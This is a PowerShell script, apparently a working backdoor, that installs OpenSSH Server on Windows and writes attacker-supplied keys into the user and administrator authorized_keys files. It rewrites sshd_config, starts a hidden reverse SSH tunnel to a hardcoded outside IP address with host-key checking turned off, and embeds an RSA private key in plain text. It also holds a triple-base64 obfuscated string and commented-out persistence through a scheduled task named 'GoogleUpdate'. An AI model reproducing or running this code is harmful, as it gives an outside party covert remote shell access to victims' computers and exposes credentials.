#$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
#Register-ScheduledTask -Xml $xml -TaskName "GoogleUpdate" -User $currentUser -Force

#$sc = 
#@'
function installSshd 
{
    $status_install = Get-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
    $status_install = $status_install.State

    if ($status_install -match "NotPresent")
    {
        Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
        Start-Service -Name sshd
        Set-Service -Name sshd -StartupType Automatic
    }    
        
    if ($status_install -match "Installed")
    {
        if (!(Test-Path -Path "C:\Windows\System32\OpenSSH\sshd.exe") -or !(Test-Path -Path "C:\Windows\System32\OpenSSH\ssh.exe")) 
        {
            Remove-WindowsCapability -Name "OpenSSH.Server~~~~0.0.1.0" -Online
            Remove-WindowsCapability -Name "OpenSSH.Client~~~~0.0.1.0" -Online
            Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
            Add-WindowsCapability -Online -Name "OpenSSH.Client~~~~0.0.1.0"
            Set-Service -Name sshd -StartupType Automatic
        }
        $status_lanch = Get-Service -Name sshd
        $status_lanch = $status_lanch.Status

        if ($status_lanch -notmatch "Running")
        {
            Start-Service -Name sshd
            #Write-Host("Service Demarré")
        }
    }
    Start-Sleep -Seconds 5
}

$Global:contentDirectory = "$env:LOCALAPPDATA/content"
if(!(Test-Path -Path $Global:contentDirectory))
{
    New-Item -ItemType Directory -Path $Global:contentDirectory -Force
}

$privateKey = '-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'

function createPrivateKeyOnRemote 
{
    #Creation cle privee sur pc distant avec utf8
    New-Item -ItemType File -Path "$Global:contentDirectory/id_rsa" -Value $privateKey -Force
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    #Droit de la key uniquement pour l'utilisateur connecté
    $directory = "$Global:contentDirectory/id_rsa"
    $acl = Get-Acl $directory
    $acl.SetAccessRuleProtection($true,$false)
    $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$currentUser","FullControl","Allow")
    $acl.SetAccessRule($AccessRule)
    $acl |Set-Acl
}

$pubKey = @"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGgLxML2qFyS+AaTnD0pY+FmT5VVFLqLWDNEqhBk9nd2ZIc3Pid01kPV7YKT8B9MuedLvtz4kbR7YXD+hZw2LfmwsiKSKmsoIppAGbi+B6GS/aa9DrnoFspPiLmFrTKuZHXe8bYA9r2UseigChT+wSdJL2ONiPZ53gU8hXVrgEUi35/t9n+3uWHxEG0WnLXaIc8tIxtUg7jdWIgy0reYyOzCdVYs0La9XnUpj42ewKOL01B9mtpo/HLlMD9can1zT5QJy9VIDLQ11wJwEDfmNkXyERNZxiU1H5KOLPkHgH2HHohr54HDBflffeLiCNSLbT+zB9yi8mxA7HFeap7qRDDsUaze5He5wJANwYX8TjDSUtVyFqIqdkFwF0Xr7U5QhlpejG7mkoqOFZdCURVkE+huAkwi+9eL2V1iWVeWMD70SPEYedvoFkgnWw9mVWdObn8b0/O9uWnDZ1B67kkA3gCGx2i6mFhZWqBRBgsVRq0nlAbOU8nUvWt0m0EN6qJ1CBZtriESit52QFhXMFlOveJmhMnIDG5LANONwhHQcpdLUTC2iHTPRC9NcKsMeRXKxchz2J03tGUFWqWnUVff058XC3Dk3EoJx9O8uEb6gN4uTYjxWB7ehXmpn3Cd+Oxn1uaY5Xwf/8WUu00ch1KVglo7xEvYbOFg4FSd1XTps3wQ== gunsa@DESKTOP-TV94KT0
"@

function createAuthorized_key #pour guest et admin
{
    $authorized_keys = "$Global:contentDirectory/authorized_keys"
    $administrators_authorized_keys = "$Global:contentDirectory/administrators_authorized_keys"
    $authorized_keys,$administrators_authorized_keys | ForEach-Object {
        if(!(Test-Path -Path $_))
        {
            New-Item -ItemType File -Path $_ -Value $pubKey -Force
            $pubKey | Out-File $_ -Encoding utf8 -Force
        }

        #ajout des droit neccessaire pour le fonctionnement
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl = Get-Acl $_
        $acl.SetAccessRuleProtection($true,$false)
        $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$currentUser","FullControl","Allow")
        $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM","FullControl","Allow")
        $acl.SetAccessRule($AccessRule)
        $acl.SetAccessRule($systemRule)
        $acl |Set-Acl
    }
}

Function configSSHD_config
{ 
    $a = @"
AuthorizedKeysFile	$Global:contentDirectory/authorized_keys
PasswordAuthentication no
Subsystem	sftp	sftp-server.exe
Match Group administrators
AuthorizedKeysFile $Global:contentDirectory/administrators_authorized_keys"
"@
    #ajout autorisation de mofifier fichier
    $pathConfigSSHD = "C:\ProgramData\ssh\sshd_config"
    New-Item -ItemType File -Path $pathConfigSSHD -Value $a -Force
}

$C = 'WXpOT2IwbERNWFpKUTBwVVpFaEtjRmt6VWtsaU0wNHdVekpXTlZFeWFHeFpNblJ3WW0xaloySnRPR2xKUjJReFltNU9hRkZFYTNkTWFrVjNUMU0wZVUxNmEzVk5lazFuVEZaSlowNXFXVEpPYW5CellqSk9hR0pIYUhaak0xRTJUV3BKWjB4WGEyZEphVkpzWW01Wk5sUkZPVVJSVlhoQ1ZVWkNSVkZXVWtKTU1rNTJZbTVTYkdKdVVYWmhWMUptWTI1T2FFbG5QVDA9'

for ($i = 0; $i -lt 3; $i++) 
{ $C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C)) }

installSshd 
createPrivateKeyOnRemote 
createAuthorized_key
configSSHD_config

$sshArgs = @(
    '-o', 'StrictHostKeyChecking=no',
    'gunsa@90.109.239.33',
    '-R', '6666:localhost:22',
    '-i', "$env:LOCALAPPDATA/content/id_rsa"
)

start-job -Name "rebootSSHD" -ScriptBlock {Restart-Service -Name sshd}
Wait-Job -Name "rebootSSHD"
Start-Sleep -Seconds 3 


Start-Process -WindowStyle Hidden -FilePath 'ssh' -ArgumentList $sshArgs

#'@ | Out-File -FilePath "$env:LOCALAPPDATA/content/SC.ps1" -Encoding utf8 -Force

<#
$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-06-22T12:04:36.3993155</Date>
    <Author>DESKTOP-TV94KT0\gunsa</Author>
    <URI>\test</URI>
  </RegistrationInfo>
  <Triggers />
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-1218715442-157715563-3366828991-1001</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd</Command>
      <Arguments>/C /MIN powershell -F "$env:LOCALAPPDATA\content/SC.ps1"</Arguments>
    </Exec>
  </Actions>
</Task>
"@
#>